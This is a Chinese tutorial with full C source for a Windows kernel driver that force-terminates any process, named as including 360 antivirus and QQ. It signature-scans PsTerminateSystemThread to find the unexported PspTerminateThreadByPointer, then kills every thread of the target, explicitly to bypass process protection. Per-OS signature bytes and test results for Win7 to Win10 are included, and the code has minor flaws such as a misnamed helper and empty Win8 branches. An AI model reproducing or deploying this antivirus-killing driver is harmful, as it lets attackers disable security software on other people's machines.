# 查找并使用PspTerminateThreadByPointer函数强制结束进程可以杀360进程

# 背景

学习计算机的同学，或多或少都会有一个黑客情节。总是会想成为一个无拘无束的“黑客”，探索计算机世界里技术的边缘，挑战一切规则与界限。其实，正如电影《东邪西毒》里欧阳峰说的：“人都会经历这个阶段，看见一座山，就想知道山后面是什么。我很想告诉ta，可能翻过去山后面，你会发觉没有什么特别，回头看会觉得这边更好”。

本文要介绍的就是在内核下实现，强制关掉指定进程，甚至可以关闭 360、QQ 等进程。这个技术，虽不能让你成为一名“黑客”，或许可以让你感受一把“黑科技”的瘾。现在，我就把实现过程和原理整理成文档，分享给大家。该程序适用于 32 位和 64 位 Win7 到 Win10 全平台系统。

# 实现过程

我们知道，线程是进程中执行运算的最小单位，是进程中的一个实体，是被系统独立调度和分派的基本单位，线程自己不拥有系统资源，只拥有一点在运行中必不可少的资源，但它可与同属一个进程的其它线程共享进程所拥有的全部资源。一个线程可以创建和撤消另一个线程，同一进程中的多个线程之间可以并发执行。

也就是说，当一个进程中的所有线程都被结束的时候，这个进程也就没有了存在的意义，也随之结束了。这，便是我们本文介绍的这种强制杀进程的实现原理，即把进程中的线程都杀掉，从而让进程消亡，实现间接杀进程的效果。

Windows 提供了一个导出的内核函数 PsTerminateSystemThread 来帮助我们结束线程，所以，类似 360、QQ 等也会对重点监测该函数，防止结束自己的线程。我们通过逆向 PsTerminateSystemThread 函数，可以发现该函数实际上调用了未导出的内核函数 PspTerminateThreadByPointer 来实现的结束线程的操作。所以，我们可以通过查找 PspTerminateThreadByPointer 函数地址，调用直接它来结束线程，就可以绕过绝大部分的进程保护，实现强制杀进程。

PspTerminateThreadByPointer 的函数声明为：

```c++
NTSTATUS PspTerminateThreadByPointer (
      PETHREAD pEThread, 
      NTSTATUS ntExitCode, 
      BOOLEAN bDirectTerminate
 );
```

但要注意，PspTerminateThreadByPointer 的函数指针的声明的调用约定：

```c++
// 32 位
typedef NTSTATUS(*PSPTERMINATETHREADBYPOINTER_X86) (
      PETHREAD pEThread, 
      NTSTATUS ntExitCode, 
      BOOLEAN bDirectTerminate
 );
// 64 位
typedef NTSTATUS(__fastcall *PSPTERMINATETHREADBYPOINTER_X64) (
      PETHREAD pEThread, 
      NTSTATUS ntExitCode, 
      BOOLEAN bDirectTerminate
 );
```

其中，PsTerminateSystemThread 里会调用 PspTerminateThreadByPointer 函数。我们使用 WinDbg 逆向 Win8.1 x64 里的 PsTerminateSystemThread 函数，如下所示：

```c++
nt!PsTerminateSystemThread:
fffff800`83904518 8bd1            mov     edx,ecx
fffff800`8390451a 65488b0c2588010000 mov   rcx,qword ptr gs:[188h]
fffff800`83904523 f7417400080000  test    dword ptr [rcx+74h],800h
fffff800`8390452a 7408            je      nt!PsTerminateSystemThread+0x1c (fffff800`83904534)
fffff800`8390452c 41b001          mov     r8b,1
fffff800`8390452f e978d9fcff      jmp     nt!PspTerminateThreadByPointer (fffff800`838d1eac)
fffff800`83904534 b80d0000c0      mov     eax,0C000000Dh
fffff800`83904539 c3              ret
```

由上面代码可以知道，我们可以通过扫描 PsTerminateSystemThread 内核函数中的特征码，从而获取 PspTerminateThreadByPointer 函数的偏移，再根据偏移计算出该函数的地址。其中，不同系统中的特征码也会不同，下面是我使用 WinDbg 逆向各个系统上总结的特征码的情况：

|      | Win 7 | win 8.1 | win 10 |
| ---- | ----- | ------- | ------ |
| 32 位 | 0xE8  | 0xE8    | 0xE8   |
| 64 位 | 0xE8  | 0xE9    | 0xE9   |

那么，我们强制杀进程的实现原理为：

- 首先，根据特征码扫描内存，获取 PspTerminateThreadByPointer 函数地址

- 然后，调用 PsLookupProcessByProcessId 函数，根据将要结束进程 ID 获取对应的进程结构对象 EPROCESS

- 接着，遍历所有的线程 ID，并调用 PsLookupThreadByThreadId 函数根据线程 ID 获取对应的线程结构 ETHREAD

- 然后，调用函数 PsGetThreadProcess 获取线程结构 ETHREAD 对应的进程结构 EPROCESS

- 这时，我们可以通过判断该进程是不是我们指定要结束的进程，若是，则调用 PspTerminateThreadByPointer 函数结束线程；否则，继续遍历下一个线程 ID

- 重复上述 3、4、5 的操作，直到线程遍历完毕


这样，我们就可以查杀指定进程的所有线程，线程被结束之后，进程也随之结束。注意的是，当调用 PsLookupProcessByProcessId 和 PsLookupThreadByThreadId 等 LookupXXX 系列函数获取对象的时候，都需要调用 ObDereferenceObject 函数释放对象，否则在某些时候会造成蓝屏。

# 编码实现

## 强制结束指定进程

```c++
// 强制结束指定进程
NTSTATUS ForceKillProcess(HANDLE hProcessId)
{
	PVOID pPspTerminateThreadByPointerAddress = NULL;
	PEPROCESS pEProcess = NULL;
	PETHREAD pEThread = NULL;
	PEPROCESS pThreadEProcess = NULL;
	NTSTATUS status = STATUS_SUCCESS;
	ULONG i = 0;

# ifdef _WIN64
	// 64 位
	typedef NTSTATUS(__fastcall *PSPTERMINATETHREADBYPOINTER) (PETHREAD pEThread, NTSTATUS ntExitCode, BOOLEAN bDirectTerminate);
# else
	// 32 位
	typedef NTSTATUS(*PSPTERMINATETHREADBYPOINTER) (PETHREAD pEThread, NTSTATUS ntExitCode, BOOLEAN bDirectTerminate);
# endif

	// 获取 PspTerminateThreadByPointer 函数地址
	pPspTerminateThreadByPointerAddress = GetPspLoadImageNotifyRoutine();
	if (NULL == pPspTerminateThreadByPointerAddress)
	{
		ShowError("GetPspLoadImageNotifyRoutine", 0);
		return FALSE;
	}
	// 获取结束进程的进程结构对象EPROCESS
	status = PsLookupProcessByProcessId(hProcessId, &pEProcess);
	if (!NT_SUCCESS(status))
	{
		ShowError("PsLookupProcessByProcessId", status);
		return status;
	}
	// 遍历所有线程, 并结束所有指定进程的线程
	for (i = 4; i < 0x80000; i = i + 4)
	{
		status = PsLookupThreadByThreadId((HANDLE)i, &pEThread);
		if (NT_SUCCESS(status))
		{
			// 获取线程对应的进程结构对象
			pThreadEProcess = PsGetThreadProcess(pEThread);
			// 结束指定进程的线程
			if (pEProcess == pThreadEProcess)
			{
				((PSPTERMINATETHREADBYPOINTER)pPspTerminateThreadByPointerAddress)(pEThread, 0, 1);
				DbgPrint("PspTerminateThreadByPointer Thread:%d\n", i);
			}
			// 凡是Lookup...，必需Dereference，否则在某些时候会造成蓝屏
			ObDereferenceObject(pEThread);
		}
	}
	// 凡是Lookup...，必需Dereference，否则在某些时候会造成蓝屏
	ObDereferenceObject(pEProcess);

	return status;
}
```

## 获取 PspTerminateThreadByPointer 函数地址

```c++
// 获取 PspTerminateThreadByPointer 函数地址
PVOID GetPspLoadImageNotifyRoutine()
{
	PVOID pPspTerminateThreadByPointerAddress = NULL;
	RTL_OSVERSIONINFOW osInfo = { 0 };
	UCHAR pSpecialData[50] = { 0 };
	ULONG ulSpecialDataSize = 0;

	// 获取系统版本信息, 判断系统版本
	RtlGetVersion(&osInfo);
	if (6 == osInfo.dwMajorVersion)
	{
		if (1 == osInfo.dwMinorVersion)
		{
			// Win7
# ifdef _WIN64
			// 64 位
			// E8
			pSpecialData[0] = 0xE8;
			ulSpecialDataSize = 1;
# else
			// 32 位
			// E8
			pSpecialData[0] = 0xE8;
			ulSpecialDataSize = 1;
# endif	
		}
		else if (2 == osInfo.dwMinorVersion)
		{
			// Win8
# ifdef _WIN64
			// 64 位

# else
			// 32 位

# endif
		}
		else if (3 == osInfo.dwMinorVersion)
		{
			// Win8.1
# ifdef _WIN64
			// 64 位
			// E9
			pSpecialData[0] = 0xE9;
			ulSpecialDataSize = 1;
# else
			// 32 位
			// E8
			pSpecialData[0] = 0xE8;
			ulSpecialDataSize = 1;
# endif			
		}
	}
	else if (10 == osInfo.dwMajorVersion)
	{
		// Win10
# ifdef _WIN64
		// 64 位
		// E9
		pSpecialData[0] = 0xE9;
		ulSpecialDataSize = 1;
# else
		// 32 位
		// E8
		pSpecialData[0] = 0xE8;
		ulSpecialDataSize = 1;
# endif
	}

	// 根据特征码获取地址
	pPspTerminateThreadByPointerAddress = SearchPspTerminateThreadByPointer(pSpecialData, ulSpecialDataSize);
	return pPspTerminateThreadByPointerAddress;
}
```

## 根据特征码获取 PspTerminateThreadByPointer 数组地址

```c++
// 根据特征码获取 PspTerminateThreadByPointer 数组地址
PVOID SearchPspTerminateThreadByPointer(PUCHAR pSpecialData, ULONG ulSpecialDataSize)
{
	UNICODE_STRING ustrFuncName;
	PVOID pAddress = NULL;
	LONG lOffset = 0;
	PVOID pPsTerminateSystemThread = NULL;
	PVOID pPspTerminateThreadByPointer = NULL;

	// 先获取 PsTerminateSystemThread 函数地址
	RtlInitUnicodeString(&ustrFuncName, L"PsTerminateSystemThread");
	pPsTerminateSystemThread = MmGetSystemRoutineAddress(&ustrFuncName);
	if (NULL == pPsTerminateSystemThread)
	{
		ShowError("MmGetSystemRoutineAddress", 0);
		return pPspTerminateThreadByPointer;
	}

	// 然后, 查找 PspTerminateThreadByPointer 函数地址
	pAddress = SearchMemory(pPsTerminateSystemThread,
		(PVOID)((PUCHAR)pPsTerminateSystemThread + 0xFF),
		pSpecialData, ulSpecialDataSize);
	if (NULL == pAddress)
	{
		ShowError("SearchMemory", 0);
		return pPspTerminateThreadByPointer;
	}

	// 先获取偏移, 再计算地址
	lOffset = *(PLONG)pAddress;
	pPspTerminateThreadByPointer = (PVOID)((PUCHAR)pAddress + sizeof(LONG) + lOffset);

	return pPspTerminateThreadByPointer;
}
```

## 指定内存区域的特征码扫描

```c++
// 指定内存区域的特征码扫描
PVOID SearchMemory(PVOID pStartAddress, PVOID pEndAddress, PUCHAR pMemoryData, ULONG ulMemoryDataSize)
{
	PVOID pAddress = NULL;
	PUCHAR i = NULL;
	ULONG m = 0;

	// 扫描内存
	for (i = (PUCHAR)pStartAddress; i < (PUCHAR)pEndAddress; i++)
	{
		// 判断特征码
		for (m = 0; m < ulMemoryDataSize; m++)
		{
			if (*(PUCHAR)(i + m) != pMemoryData[m])
			{
				break;
			}
		}
		// 判断是否找到符合特征码的地址
		if (m >= ulMemoryDataSize)
		{
			// 找到特征码位置, 获取紧接着特征码的下一地址
			pAddress = (PVOID)(i + ulMemoryDataSize);
			break;
		}
	}

	return pAddress;
}
```

# 程序测试

在 Win7 32 位系统下，驱动程序正常执行：

![](README.assets/b1dc9e02079d770a605fd9188a2f34f4.writebug)

在 Win8.1 32 位系统下，驱动程序正常执行：

![](README.assets/ee18ff48f7a463ac80961d76bcb9a355.writebug)

在 Win10 32 位系统下，驱动程序正常执行：

![](README.assets/7d78176b69f41418058f21628d7c5e28.writebug)

在 Win7 64 位系统下，驱动程序正常执行：

![](README.assets/25c3b14b6f2dca9ec0f4929637a8ad1e.writebug)

在 Win8.1 64 位系统下，驱动程序正常执行：

![](README.assets/315c5c35ffe0db597266923dfcbc8ad1.writebug)

在 Win10 64 位系统下，驱动程序正常执行：

![](README.assets/80c48f4caaff5449c2b3c5fe8ccbdfba.writebug)

# 总结

这个程序的原理不难理解，关键是如何定位 PspTerminateThreadByPointer 未导出的内核函数在 PsTerminateSystemThread 函数中的位置，要在各个版本系统上进行逆向，以确定内存特征码。

# 参考

参考自《[Windows黑客编程技术详解]("Windows黑客编程技术详解")》一书